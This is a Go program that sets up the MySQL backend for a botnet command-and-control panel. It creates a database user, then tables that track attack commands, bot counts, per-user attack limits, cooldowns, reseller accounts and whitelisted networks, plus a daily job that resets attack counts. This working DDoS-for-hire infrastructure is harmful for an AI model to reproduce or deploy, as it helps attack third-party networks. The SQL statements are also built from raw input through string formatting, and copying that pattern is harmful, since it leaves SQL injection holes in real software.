package main

import (
	"database/sql"
	"fmt"
	"log"
	"strings"

	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/bcrypt"
)

func readInput(prompt string) string {
	fmt.Print(prompt)
	var input string
	fmt.Scanln(&input)
	return input
}

func encryptPassword(password string) (string, error) {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}
	return string(hashedPassword), nil
}

func main() {
	currentRootPassword := readInput("Enter the current MySQL root password (press Enter if no password set): ")

	var db *sql.DB
	var err error
	
	if currentRootPassword == "" {
		db, err = sql.Open("mysql", "root@tcp(localhost:3306)/")
	} else {
		db, err = sql.Open("mysql", "root:"+currentRootPassword+"@tcp(localhost:3306)/")
	}

	if err != nil {
		log.Fatalf("Error connecting to MySQL: %v\n", err)
	}
	defer db.Close()

	cncUsername := readInput("Enter the MySQL username: ")
	cncPassword := readInput("Enter the MySQL password: ")
	dbName := readInput("Enter the new database name: ")

	_, err = db.Exec(fmt.Sprintf("CREATE USER '%s'@'localhost' IDENTIFIED BY '%s'", cncUsername, cncPassword))
	if err != nil {
		log.Fatalf("Error creating CNC user: %v\n", err)
	}

	_, err = db.Exec(fmt.Sprintf("GRANT ALL PRIVILEGES ON %s.* TO '%s'@'localhost'", dbName, cncUsername))
	if err != nil {
		log.Fatalf("Error granting privileges to CNC user: %v\n", err)
	}

	adminUsername := readInput("Enter the CNC username: ")
	adminPassword := readInput("Enter the CNC password: ")

	hashedAdminPassword, err := encryptPassword(adminPassword)
	if err != nil {
		log.Fatalf("Error encrypting admin password: %v\n", err)
	}

	fmt.Printf("\nCNC Username: %s\nCNC Password: %s\nDatabase Name: %s\n", cncUsername, cncPassword, dbName)

	fmt.Printf("Admin Username: %s\nAdmin Password (bcrypt string): %s\n", adminUsername, hashedAdminPassword)

	fmt.Println("\nRemember to edit cnc/config.json with the above CNC username, password, and database name.")

	_, err = db.Exec("CREATE DATABASE " + dbName)
	if err != nil {
		log.Fatalf("Error creating database: %v\n", err)
	}

	_, err = db.Exec("USE " + dbName)
	if err != nil {
		log.Fatalf("Error using database: %v\n", err)
	}

	sqlScript := `
SET @L_NOTES=@@SQL_NOTES, SQL_NOTES=0;

DROP TABLE IF EXISTS history;
CREATE TABLE history (
    id int(10) unsigned NOT NULL AUTO_INCREMENT,
    user_id int(10) unsigned NOT NULL,
    time_sent int(10) unsigned NOT NULL,
    duration int(10) unsigned NOT NULL,
    command text NOT NULL,
    max_bots int(11) DEFAULT '-1',
    PRIMARY KEY (id),
    KEY user_id (user_id)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

SET @@SQL_NOTES=@L_NOTES;

DROP TABLE IF EXISTS users;
CREATE TABLE users (
    id int(10) unsigned NOT NULL AUTO_INCREMENT,
    username varchar(32) NOT NULL,
    password varchar(60) DEFAULT NULL,
    duration_limit int(11) NOT NULL,
    cooldown int(11) NOT NULL,
    max_bots int(11) NOT NULL DEFAULT '-1',
    admin tinyint(1) NOT NULL,
    max_attacks int(11) NOT NULL,
    total_attacks int(11) DEFAULT '0',
    expiry bigint(17) NOT NULL,
    reseller tinyint(1) NOT NULL DEFAULT '0',
    created_by varchar(32) NOT NULL,
    PRIMARY KEY (id),
    KEY username (username)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

INSERT INTO users (username, password, duration_limit, cooldown, max_bots, admin, max_attacks, total_attacks, expiry, reseller, created_by) VALUES (?, ?, 120, 0, -1, 1, 100, 9, 14407088839, 0, 'server');

SET @@SQL_NOTES=@L_NOTES;

DROP TABLE IF EXISTS whitelist;
CREATE TABLE whitelist (
    id int(10) unsigned NOT NULL AUTO_INCREMENT,
    prefix varchar(16) DEFAULT NULL,
    netmask tinyint(3) unsigned DEFAULT NULL,
    PRIMARY KEY (id),
    KEY prefix (prefix)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

SET @@SQL_NOTES=@L_NOTES;

SET GLOBAL event_scheduler = ON;

CREATE EVENT IF NOT EXISTS reset_total_attacks_event
ON SCHEDULE EVERY 1 DAY
DO
  UPDATE users
  SET total_attacks = 0;
`

	statements := strings.Split(sqlScript, ";")

	for _, stmt := range statements {
		trimmedStmt := strings.TrimSpace(stmt)
		if len(trimmedStmt) == 0 {
			continue
		}
		if strings.HasPrefix(trimmedStmt, "INSERT INTO users") {
			_, err = db.Exec(trimmedStmt, adminUsername, hashedAdminPassword)
		} else {
			_, err = db.Exec(trimmedStmt)
		}
		if err != nil {
			log.Fatalf("[exec] error: %v\n", err)
		}
	}

	fmt.Println("\nMySQL database setup complete.")
}
